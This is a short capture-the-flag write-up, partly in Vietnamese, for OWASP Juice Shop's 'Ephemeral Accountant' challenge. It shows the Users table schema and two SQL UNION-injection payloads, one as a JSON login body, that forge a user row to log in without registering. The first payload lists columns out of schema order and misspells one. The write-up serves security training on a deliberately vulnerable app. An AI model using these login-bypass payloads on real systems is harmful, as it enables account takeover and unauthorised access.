# Ephemeral Accountant

- **Vulnerability**: Injection
- **Difficult Level**: 4/6
- **Description**: Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user.

---

Sau khi có được schema của bảng `User` từ challenge `Database Schema`:

```
"CREATE TABLE `Users` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT,
`username` VARCHAR(255) DEFAULT '',
`email` VARCHAR(255) UNIQUE,
`password` VARCHAR(255),
`role` VARCHAR(255) DEFAULT 'customer',
`deluxeToken` VARCHAR(255) DEFAULT '',
`lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0',
`profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg',
`totpSecret` VARCHAR(255) DEFAULT '',
`isActive` TINYINT(1) DEFAULT 1,
`createdAt` DATETIME NOT NULL,
`updatedAt` DATETIME NOT NULL,
`deletedAt` DATETIME)"
```

ta dựa vào đó để viết payload nhằm đăng nhập dưới email một user không có thật `acc0unt4nt@juice-sh.op`:

```
' union select * from (
select 200 as id, '' as username,
'acc0unt4nt@juice-sh.op' as email,
'abcd1234' as password,
'accountant' as role,
'127.0.0.1' as lastLoginIp,
'' as profileImage,
'' as totpSecret,
'' as isActive,
'' as createdAt,
'' as updatedAt,
'' as deluxToken,
NULL as deletedAt)--
```

```
{
  "email":"' union select * from (select 1 as 'id', '' as 'username','acc0unt4nt@juice-sh.op' as 'email','abcd1234' as 'password','accounting' as 'role','' as 'deluxeToken','127.0.0.1' as 'lastLoginIp','' as 'profileImage','' as 'totpSecret',1 as 'isActive','' as 'createdAt','' as 'updatedAt',NULL as 'deletedAt')--",
  "password":""}
```
